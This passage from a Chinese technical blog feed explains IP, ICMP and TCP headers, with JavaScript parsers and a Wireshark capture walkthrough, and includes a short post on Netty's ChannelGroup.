_readerIndex++;</span><br><span class="line"></span><br><span class="line">    checksum = ip.<span class="title function_">readUInt16BE</span>(_readerIndex);</span><br><span class="line">    _readerIndex += <span class="number">2</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">let</span> p = <span class="number">0</span>; p &lt; <span class="number">4</span>; p++) source[p] = ip.<span class="title function_">readUInt8</span>(_readerIndex++);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">let</span> p = <span class="number">0</span>; p &lt; <span class="number">4</span>; p++) dest[p] = ip.<span class="title function_">readUInt8</span>(_readerIndex++);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (_readerIndex &lt; ihl * <span class="number">4</span>) options = ip.<span class="title function_">toString</span>(<span class="string">&#x27;hex&#x27;</span>, _readerIndex);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> {</span><br><span class="line">        version, ihl, type, len, id, flags, offset, ttl, protocol, checksum, source, dest, options</span><br><span class="line">    };</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="title function_">parseIP</span>(<span class="title class_">Buffer</span>.<span class="title function_">from</span>(<span class="string">&#x27;4500004000004000400635c70a0001022f5eca91&#x27;</span>, <span class="string">&#x27;hex&#x27;</span>)));</span><br></pre></td></tr></table></figure><p>查看路由表</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">netstat -nr</span><br></pre></td></tr></table></figure><h3 id="ICMP"><a href="#ICMP" class="headerlink" title="ICMP"></a>ICMP</h3><p>ICMP（Internet Control Message Protocol）它是TCP&#x2F;IP协议族的一个子协议，用于在IP主机、路由器之间传递控制消息。控制消息是指网络通不通、主机是否可达、路由是否可用等网络本身的消息。这些控制消息虽然并不传输用户数据，但是对于用户数据的传递起着重要的作用。</p><table><thead><tr><th>消息</th><th>类型</th><th>含义</th></tr></thead><tbody><tr><td>Echo reply</td><td>0</td><td>响应 Echo 消息</td></tr><tr><td>Destination unreachable</td><td>3</td><td>出于某些原因包没有到达目的地而是被丢弃，则通过此消息通知发送方。可能的原因包括目标 IP 地址在路由表中不存在；目标端口号不存在对应的套接字；需要分片，但分片被禁用</td></tr><tr><td>Source quench</td><td>4</td><td>当发送的包数量超过路由器的转发能力时，超过的部分会被丢弃，这时会通过这一消息通知发送方。但是，并不是说遇到这种情况一定会发送这一消息。当路由器的性能不足时，可能连这条消息都不发送，就直接把多余的包丢弃了。当发送方收到这条消息时，必须降低发送速率</td></tr><tr><td>Redirect</td><td>5</td><td>当查询路由表后判断该包的入口和出口为同一个网络接口时，则表示这个包不需要该路由器转发，可以由发送方直接发送给下一个路由器。遇到这种情况时，路由器会发送这条消息，给出下一个路由器的 IP 地址，指示发送方直接发送过去</td></tr><tr><td>Echo</td><td>8</td><td><strong>ping</strong> 命令发送的消息。收到这条消息的设备需返回一个 <code>Echo reply</code> 消息，以便确认通信对象是否存在</td></tr><tr><td>Time exceeded</td><td>11</td><td>由于超过了 IP 头部中的 TTL 字段表示的存活时间而被路由器丢弃，此时路由器会向发送方发送这条消息</td></tr><tr><td>Parameter problem</td><td>12</td><td>由于 IP 头部字段存在错误而被丢弃，此时会向发送方发送这条消息</td></tr></tbody></table><h3 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h3><ul><li><a href="https://tools.ietf.org/html/rfc793#section-3.1">TRANSMISSION CONTROL PROTOCOL</a></li><li><a href="https://book.douban.com/subject/26941639/">网络是怎么连接的</a></li><li><a href="https://book.douban.com/subject/1088054/">TCP&#x2F;IP详解 卷1：协议</a></li><li><a href="https://book.douban.com/subject/1683696/">TCP&#x2F;IP网络与协议（第二版）</a></li><li><a href="https://www.zhihu.com/question/21524257">为什么标准以太网接口缺省的MTU为1500？</a></li><li><a href="https://community.emc.com/message/842879#842879">细说TCP确认机制</a></li></ul>]]></content>
      
      
      
        <tags>
            
            <tag> tcp </tag>
            
            <tag> ip </tag>
            
            <tag> mac </tag>
            
            <tag> arp </tag>
            
            <tag> icmp </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Netty ChannelGroup</title>
      <link href="/post/netty-channelgroup.html"/>
      <url>/post/netty-channelgroup.html</url>
      
        <content type="html"><![CDATA[<h2 id="ChannelGroup-分析"><a href="#ChannelGroup-分析" class="headerlink" title="ChannelGroup 分析"></a>ChannelGroup 分析</h2><p><code>ChannelGroup</code> 用来管理一组 <code>Channel</code>，我们可以很方便的对一组 <code>Channel</code> 做同样的操作。从类图关系来看，<code>ChannelGroup</code>本质上还是一个<code>Set</code>。</p><p><img src="/images/channelgroup.png" alt="ChannelGroup"></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">ChannelGroup</span> <span class="variable">channels</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">DefaultChannelGroup</span>(GlobalEventExecutor.INSTANCE);</span><br></pre></td></tr></table></figure><p>查看<a href="https://github.com/netty/netty/blob/4.1/transport/src/main/java/io/netty/channel/group/DefaultChannelGroup.java#L138">DefaultChannelGroup</a>实现，我们添加<code>Channel</code>时都会注册一个事件，当<code>Channel</code>关闭后会自动把它从<code>ChannelGroup</code>删除掉。所以，我们只需要正常关闭<code>Channel</code>。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="keyword">final</span> <span class="type">ChannelFutureListener</span> <span class="variable">remover</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChannelFutureListener</span>() &#123;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">operationComplete</span><span class="params">(ChannelFuture future)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        remove(future.channel());</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="meta">@Override</span></span><br><span class="line"><span class="keyword">public</span> <span class="type">boolean</span> <span class="title function_">add</span><span class="params">(Channel channel)</span> &#123;</span><br><span class="line">    ... </span><br><span class="line">    <span class="type">boolean</span> <span class="variable">added</span> <span class="operator">=</span> map.putIfAbsent(channel.id(), channel) == <span class="literal">null</span>;</span><br><span class="line">    <span class="keyword">if</span> (added) &#123;</span><br><span class="line">        channel.closeFuture().addListener(remover);</span><br><span class="line">    &#125;</span><br><span class="line">    ... </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      
        <tags>
            
            <tag> netty </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>TCP协议</title>
      <link href="/post/tcp-protocol.html"/>
      <url>/post/tcp-protocol.html</url>
      
        <content type="html"><![CDATA[<h2 id="TCP-协议"><a href="#TCP-协议" class="headerlink" title="TCP 协议"></a>TCP 协议</h2><p>TRANSMISSION CONTROL PROTOCOL</p><h3 id="网络包收发"><a href="#网络包收发" class="headerlink" title="网络包收发"></a>网络包收发</h3><p><img src="/images/tcp-ip-mac.png"></p><p>包收发操作的起点是 TCP 模块委托 IP 模块发送包的操作。这个委托的过程就是 TCP 模块在数据块的前面加上 TCP 头部，然后整个传递给 IP 模块，这部分就是网络包的内容。与此同时， TCP 模块还需要指定通信对象的 IP 地址，也就是需要写清楚“将什么内容发给谁”。</p><p>收到委托后，IP 模块会将包的内容当作一整块数据，在前面加上包含控制信息的 IP 头部和 MAC 头部。IP 头部中包含 IP 协议规定的、根据 IP 地址将包发往目的地所需的控制信息；MAC 头部包含通过以太网的局域网将包传输至最近的路由器所需的控制信息。</p><p>封装好的包会传递给网卡，传递给网卡的网络包是由一连串 0 和 1 组成的数字信息，网卡会将这些数字信息转换为电信号或光信号，并通过网线（或光纤）发送出去，然后这些信号就会到达集线器、路由器等转发设备，再由转发设备一步一步地送达接收方。</p><h3 id="连接-收发-断开"><a href="#连接-收发-断开" class="headerlink" title="连接-收发-断开"></a>连接-收发-断开</h3><ol><li><p>连接</p><p> 以太网的网线都是一直连接的状态，我们并不需要来回插拔网线，那么这里<code>连接</code>到底是什么意思呢？连接实际上是通信双方交换控制信息，在套接字中记录这些必要信息并准备数据收发的一连串操作。</p><p> <img src="/images/tcp-connection.png"></p></li><li><p>收发</p></li><li><p>断开</p><p> TCP 断开是双方协商的，任何一端都可以发起断开。套接字并不会立即被删除，而是会等待一段时间之后再被删除。<br> <img src="/images/tcp-close.png"></p><blockquote><p>断开需要双方各自发起并确认，共四步操作。有些情况下三步也能完成，第2、3步合并后和四步操作的效果是一样的。</p></blockquote></li></ol><h3 id="协议分析"><a href="#协议分析" class="headerlink" title="协议分析"></a>协议分析</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ curl http://css.kekek.cc</span><br></pre></td></tr></table></figure><p>(tcp.dstport &#x3D;&#x3D; 80 and ip.dst &#x3D;&#x3D; 47.94.202.145) or (ip.addr &#x3D;&#x3D; 47.94.202.145 and tcp.port &#x3D;&#x3D; 80)<br><img src="/images/wireshark.png"></p><ol><li>Frame:   物理层的数据帧概况</li><li>Ethernet II: 数据链路层以太网帧头部信息</li><li>Internet Protocol Version 4: 互联网层IP包头部信息</li><li>Transmission Control Protocol:  传输层的数据段头部信息，此处是TCP</li><li>Hypertext Transfer Protocol:  应用层的信息，此处是HTTP协议</li></ol><p><a href="https://tools.ietf.org/html/rfc793#section-3.1"> TCP Header Format</a></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"> 0                   1                   2                   3</span><br><span class="line"> 0 1 2 3 4 5 6 7 8 9 0 1 2 3 4 5 6 7 8 9 0 1 2 3 4 5 6 7 8 9 0 1</span><br><span class="line">+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+</span><br><span class="line">|          Source Port          |       Destination Port        |</span><br><span class="line">+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+</span><br><span class="line">|                        Sequence Number                        |</span><br><span class="line">+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+</span><br><span class="line">|                    Acknowledgment Number                      |</span><br><span class="line">+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+</span><br><span class="line">|  Data |           |U|A|P|R|S|F|                               |</span><br><span class="line">| Offset| Reserved  |R|C|S|S|Y|I|            Window             |</span><br><span class="line">|       |           |G|K|H|T|N|N|                               |</span><br><span class="line">+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+</span><br><span class="line">|           Checksum            |         Urgent Pointer        |</span><br><span class="line">+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+</span><br><span class="line">|                    Options                    |    Padding    |</span><br><span class="line">+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+</span><br><span class="line">|                             data                              |</span><br><span class="line">+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+</span><br></pre></td></tr></table></figure><ul><li><p>Source Port 源端口号 16位</p></li><li><p>Destination Port 目标端口号 16位</p></li><li><p>Sequence Number 序列号 32位</p><p>  代表偏移量，本包在整个信息中的偏移量，也就是发送的数据部分第一个字节的序号。TCP 模块在拆分数据时，会先算好每一块数据相当于从头开始的第几个字节。在实际的通信中，序号并不是从 1 开始的，而是需要用随机数计算出一个初始值，初始值在握手阶段发送给对方。</p></li><li><p>Acknowledgment Number 确认号 32位 </p><p>  表示接收方希望收到对方下次发送的数据的第一个字节的序号。</p><p>  在TCP确认机制中，无法有效处理非连续TCP片段。确认号表明所有低于该编号的 Sequence Number 已经被发送该编号的设备接收。如果我们收到的字节数落在两个非连续的范围内，则无法只通过一个编号来确认。这可能导致潜在严重的性能问题，特别是高速或可靠性较差的网络。</p></li><li><p>Data Offset 4位</p><p>  表示数据部分的起始位置，也可以认为表示头部的长度。<code>The number of 32 bit words in the TCP Header.</code> 它的基数是32 bit（即4个字节），例如<code>1011</code>表示头部共<code>0b0111 * 32 = 352 bits</code>(44 bytes)。其中主要是<code>Options</code>部分为可变长度。</p></li><li><p>Reserved 预留6位</p></li><li><p>Control Bits:  控制位 6 bits (from left to right):</p><ul><li><p>URG:  Urgent Pointer field significant</p><p>  URG 为紧急标志，和紧急指针字段配合使用。当 URG 位置为1时，表名此报文要尽快传送，而不按原排队次序发送。</p></li><li><p>ACK:  Acknowledgment field significant</p><p>  确认标志，和 Acknowledgment Number 配合使用。</p></li><li><p>PSH:  Push Function</p><p>  PSH 为推送标志，当 PSH 位置为1时，发送方将立即发送缓冲区中的数据，而不等待后续数据构成一个更大的段。接收方一旦收到 PSH 位位1的段，就立即将接收缓冲区中的数据提交给应用程序，而不等待后续数据到达。</p></li><li><p>RST:  Reset the connection</p><p>  复位标志。当 RST 位置为1时，表名有严重差错，必须释放连接。</p></li><li><p>SYN:  Synchronize sequence numbers</p><p>  同步标志。当 SYN 为1是表示请求建立连接，此时会发送初始 Sequence Number。</p></li><li><p>FIN:  No more data from sender</p><p>  终止标志。当 FIN 位置为1时，表明是护具已经发送完，请求释放连接。</p></li></ul></li><li><p>Window 窗口 16位</p><p>  接收方告知发送方窗口大小（即无需等待确认可一起发送的数据量），用于通知对方当前机器接收区的大小。提高效率的一种方式，不用每次发包都要<code>ack</code>一下，可以发多个包后一次<code>ack</code>。</p></li><li><p>Checksum 校验和 16位</p><p>  用来检查是否出现错误</p></li><li><p>Urgent Pointer 紧急指针 16位</p><p>  表示应紧急处理的数据位置</p></li><li><p>Options 可选字段</p><p>  除了上面的固定头部字段之外，还可以添加可选字段，但除了连接操作之外，很少使用可选字段。</p>  <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">   kid       len          </span><br><span class="line">+--------+</span><br><span class="line">|00000000|</span><br><span class="line">+--------+</span><br><span class="line">|00000001|</span><br><span class="line">+--------+--------+--------+--------+</span><br><span class="line">|00000010|00000100|   max seg size  |</span><br><span class="line">+--------+--------+--------+--------+</span><br><span class="line">|00000011|00000011| wscale |</span><br><span class="line">+--------+--------+--------+</span><br><span class="line">|00000100|00000010|</span><br><span class="line">+--------+--------+</span><br></pre></td></tr></table></figure><ul><li><p>0：选项表结束（1字节）</p></li><li><p>1：无操作（1字节）用于选项字段之间的字边界对齐。</p></li><li><p>2：最大报文段长度（4字节，Maximum Segment Size，MSS）通常在建立连接而设置SYN标志的数据包中指明这个选项，指明本端所能接收的最大长度的报文段。通常将MSS设置为（MTU-40）字节，携带TCP报文段的IP数据报的长度就不会超过MTU，从而避免本机发生IP分片。只能出现在同步报文段中，否则将被忽略。</p></li><li><p>3：窗口扩大因子（4字节，wscale），取值0-14。用来把TCP的窗口的值左移的位数，使窗口值乘倍。只能出现在同步报文段中，否则将被忽略。这是因为现在的TCP接收数据缓冲区（接收窗口）的长度通常大于65535字节。</p></li><li><p>4：sackOK—发送端支持并同意使用SACK选项。</p></li><li><p>5：SACK实际工作的选项。</p></li><li><p>8：时间戳（10字节，TCP Timestamps Option，TSopt）</p><ul><li>发送端的时间戳（Timestamp Value field，TSval，4字节）</li><li>时间戳回显应答（Timestamp Echo Reply field，TSecr，4字节）</li></ul></li></ul>  <figure class="highlight js"><figcaption><span>parse_tcp_header_options.js</span><a href="/downloads/code/parse_tcp_header_options.js">view raw</a></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">parseTCPHeader</span>(<span class="params">header</span>) {</span><br><span class="line">    <span class="keyword">if</span> (header.<span class="property">length</span> &lt; <span class="number">20</span>) <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">Error</span>(<span class="string">&#x27;Bad Frame&#x27;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">let</span> _readerIndex = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">let</span> sourcePort = header.<span class="title function_">readUInt16BE</span>(_readerIndex);</span><br><span class="line">    _readerIndex += <span class="number">2</span>;</span><br><span class="line">    <span class="keyword">let</span> destinationPort = header.<span class="title function_">readUInt16BE</span>(_readerIndex);</span><br><span class="line">    _readerIndex += <span class="number">2</span>;</span><br><span class="line">    <span class="keyword">let</span> sequenceNumber = header.<span class="title function_">readUInt32BE</span>(_readerIndex);</span><br><span class="line">    _readerIndex += <span class="number">4</span>;</span><br><span class="line">    <span class="keyword">let</span> acknowledgmentNumber = header.<span class="title function_">readUInt32BE</span>(_readerIndex);</span><br><span class="line">    _readerIndex += <span class="number">4</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">let</span> dataOffsetAndFlags = header.<span class="title function_">readUInt16BE</span>(_readerIndex);</span><br><span class="line">    _readerIndex += <span class="number">2</span>;</span><br><span class="line">    <span class="keyword">let</span> dataOffset = dataOffsetAndFlags &gt;&gt; <span class="number">12</span>;</span><br><span class="line">    <span class="keyword">let</span> headerLength = dataOffset * <span class="number">4</span>; <span class="comment">// 4 bytes 32 bits</span></span><br><span class="line">    <span class="keyword">let</span> urg = dataOffsetAndFlags &gt;&gt; <span class="number">5</span> &amp; <span class="number">0x01</span>;</span><br><span class="line">    <span class="keyword">let</span> ack = dataOffsetAndFlags &gt;&gt; <span class="number">4</span> &amp; <span class="number">0x01</span>;</span><br><span class="line">    <span class="keyword">let</span> psh = dataOffsetAndFlags &gt;&gt; <span class="number">3</span> &amp; <span class="number">0x01</span>;</span><br><span class="line">    <span class="keyword">let</span> rst = dataOffsetAndFlags &gt;&gt; <span class="number">2</span> &amp; <span class="number">0x01</span>;</span><br><span class="line">    <span class="keyword">let</span> syn = dataOffsetAndFlags &gt;&gt; <span class="number">1</span> &amp; <span class="number">0x01</span>;</span><br><span class="line">    <span class="keyword">let</span> fin = dataOffsetAndFlags &amp; <span class="number">0x01</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">let</span> <span class="variable language_">window</span> = header.<span class="title function_">readUInt16BE</span>(_readerIndex);</span><br><span class="line">    _readerIndex += <span class="number">2</span>;</span><br><span class="line">    <span class="keyword">let</span> checksum = header.<span class="title function_">readUInt16BE</span>(_readerIndex);</span><br><span class="line">    _readerIndex += <span class="number">2</span>;</span><br><span class="line">    urgentPointer = header.<span class="title function_">readUInt16BE</span>(_readerIndex);</span><br><span class="line">    _readerIndex += <span class="number">2</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">let</span> options;</span><br><span class="line">    <span class="keyword">if</span> (headerLength &gt; <span class="number">20</span>) options = <span class="title function_">parseTCPOptions</span>(header.<span class="title function_">slice</span>(_readerIndex)); </span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> {</span><br><span class="line">        sourcePort,</span><br><span class="line">        destinationPort,</span><br><span class="line">        sequenceNumber,</span><br><span class="line">        acknowledgmentNumber,</span><br><span class="line">        dataOffset,</span><br><span class="line">        urg,</span><br><span class="line">        ack,</span><br><span class="line">        psh,</span><br><span class="line">        rst,</span><br><span class="line">        syn,</span><br><span class="line">        fin,</span><br><span class="line">        <span class="variable language_">window</span>,</span><br><span class="line">        checksum,</span><br><span class="line">        urgentPointer,</span><br><span class="line">        options</span><br><span class="line">    }</span><br><span class="line">}</span><br></pre></td></tr></table></figure></li></ul><p>示例：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">0000   d2 e6 00 50 f5 e9 1f 49 00 00 00 00 b0 02 ff ff</span><br><span class="line">0010   5a 79 00 00 02 04 05 b4 01 03 03 05 01 01 08 0a</span><br><span class="line">0020   ba 87 34 a1 00 00 00 00 04 02 00 00</span><br></pre></td></tr></table></figure><p>上图中<code>Source Port</code>为<code>0xd2e6</code>对应十进制为<code>53990</code>，<code>Destination Port</code>为<code>0x0050</code>十进制为<code>80</code>。<code>Sequence Number</code>为<code>0xf5ef1f49</code>对应十进制为<code>4126089033</code>，<code>Acknowledgment Number</code>为<code>0x000000</code>。<code>Data Offset</code>、<code>Reserved</code>及<code>Control Bits</code>合并为<code>0xb002</code>，对应二进制<code>1011000000000010</code>其中<code>Data Offset</code>为<code>1011</code>则头部长度为44 bytes，<code>Control Bits</code>为<code>000010</code>对照为<code>SYN</code>类型。<code>Window</code>为<code>0xffff</code>。<code>Checksum</code>为为<code>0x5a79</code>。<code>Urgent Pointer</code>为<code>0x0000</code>。<code>Options</code>为<code>020405b4010303050101080aba8734a10000000004020000</code>解析出来为<code>&quot;mss&quot;:1460,&quot;wscale&quot;:5,&quot;sackOK&quot;:true,&quot;tsVal&quot;:3129423009,&quot;tsEcr&quot;:0</code>。</p><blockquote><p>TCP 包的长度有 MTU 确定，在以太网中一般是 1500 bytes。MTU 是包含头部（TCP头部、IP头部）的总长度，因此需要从 MTU 减去头部的长度，然后得到的长度就是一个网络包中所能容纳的最大数据长度，这一长度叫作 MSS。</p></blockquote><table><thead><tr><th>No.</th><th>服务器:80</th><th>流向</th><th>客户端:53990</th><th>说明</th></tr></thead><tbody><tr><td><strong>TCP 连接</strong></td><td></td><td></td><td></td><td></td></tr><tr><td>399</td><td></td><td>&lt;–</td><td>SYN:4125695817 SN:4125695817 Window:65535</td><td>[连接] 客户端发起，初始SN为4125695817</td></tr><tr><td>400</td><td>ACK:4125695818,SYN:787209242 SN:787209242 Window:14480</td><td>–&gt;</td><td></td><td>[连接] 服务器ACK并发送初始SN为787209242</td></tr><tr><td>401</td><td></td><td>&lt;–</td><td>ACK:787209243 SN:4125695818 Window:4117</td><td>[连接] 客户端ACK 更新窗口为4117</td></tr><tr><td><strong>HTTP 请求</strong></td><td></td><td></td><td></td><td></td></tr><tr><td>402</td><td></td><td>&lt;–</td><td>ACK:787209243,PSH SN:4125695818 Window:4117</td><td>[收发] 客户端发送HTTP请求数据</td></tr><tr><td>403</td><td>ACK:4125695894 SN:787209243 Window:227</td><td>–&gt;</td><td></td><td>[收发] 服务器ACK客户端请求数据</td></tr><tr><td><strong>HTTP 响应</strong></td><td></td><td></td><td></td><td></td></tr><tr><td>404</td><td>ACK:4125695894 SN:787209243 Window:227</td><td>–&gt;</td><td></td><td>[收发] 服务器端发送数据</td></tr><tr><td>405</td><td>ACK:4125695894 SN:787210691 Window:227</td><td>–&gt;</td><td></td><td>[收发] 服务器端发送数据</td></tr><tr><td>406</td><td>ACK:4125695894,PSH SN:787212139 Window:227</td><td>–&gt;</td><td></td><td>[收发] 服务器端发送数据</td></tr><tr><td>407</td><td></td><td>&lt;–</td><td>ACK:787212139 SN:4125695894 Window:4050</td><td>[收发] 客户端确认</td></tr><tr><td>408</td><td></td><td>&lt;–</td><td>ACK:787213379 SN:4125695894 Window:4012</td><td>[收发] 更新窗口</td></tr><tr><td><strong>TCP 关闭</strong></td><td></td><td></td><td></td><td></td></tr><tr><td>409</td><td></td><td>&lt;–</td><td>ACK:787213379,FIN SN:4125695894 Window:4096</td><td></td></tr><tr><td>411</td><td>ACK:4125695895,FIN SN:787213379 Window:227</td><td>–&gt;</td><td></td><td>这步是一个合并操作，效果等同于四次握手</td></tr><tr><td>412</td><td></td><td>&lt;–</td><td>ACK:787213380 SN:4125695895 Window:4096</td><td></td></tr></tbody></table><p>解析TCP头部代码</p><figure class="highlight js"><figcaption><span>parse_tcp_header.js</span><a href="/downloads/code/parse_tcp_header.js">view raw</a></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">parseTCPHeader</span>(<span class="params">header</span>) {</span><br><span class="line">    <span class="keyword">if</span> (header.<span class="property">length</span> &lt; <span class="number">20</span>) <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">Error</span>(<span class="string">&#x27;Bad Frame&#x27;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">let</span> _readerIndex = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">let</span> sourcePort = header.<span class="title function_">readUInt16BE</span>(_readerIndex);</span><br><span class="line">    _readerIndex += <span class="number">2</span>;</span><br><span class="line">    <span class="keyword">let</span> destinationPort = header.<span class="title function_">readUInt16BE</span>(_readerIndex);</span><br><span class="line">    _readerIndex += <span class="number">2</span>;</span><br><span class="line">    <span class="keyword">let</span> sequenceNumber = header.<span class="title function_">readUInt32BE</span>(_readerIndex);</span><br><span class="line">    _readerIndex += <span class="number">4</span>;</span><br><span class="line">    <span class="keyword">let</span> acknowledgmentNumber = header.<span class="title function_">readUInt32BE</span>(_readerIndex);</span><br><span class="line">    _readerIndex += <span class="number">4</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">let</span> dataOffsetAndFlags = header.<span class="title function_">readUInt16BE</span>(_readerIndex);</span><br><span class="line">    _readerIndex += <span class="number">2</span>;</span><br><span class="line">    <span class="keyword">let</span> dataOffset = dataOffsetAndFlags &gt;&gt; <span class="number">12</span>;</span><br><span class="line">    <span class="keyword">let</span> headerLength = dataOffset * <span class="number">4</span>; <span class="comment">// 4 bytes 32 bits</span></span><br><span class="line">    <span class="keyword">let</span> urg = dataOffsetAndFlags &gt;&gt; <span class="number">5</span> &amp; <span class="number">0x01</span>;</span><br><span class="line">    <span class="keyword">let</span> ack = dataOffsetAndFlags &gt;&gt; <span class="number">4</span> &amp; <span class="number">0x01</span>;</span><br><span class="line">    <span class="keyword">let</span> psh = dataOffsetAndFlags &gt;&gt; <span class="number">3</span> &amp; <span class="number">0x01</span>;</span><br><span class="line">    <span class="keyword">let</span> rst = dataOffsetAndFlags &gt;&gt; <span class="number">2</span> &amp; <span class="number">0x01</span>;</span><br><span class="line">    <span class="keyword">let</span> syn = dataOffsetAndFlags &gt;&gt; <span class="number">1</span> &amp; <span class="number">0x01</span>;</span><br><span class="line">    <span class="keyword">let</span> fin = dataOffsetAndFlags &amp; <span class="number">0x01</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">let</span> <span class="variable language_">window</span> = header.<span class="title 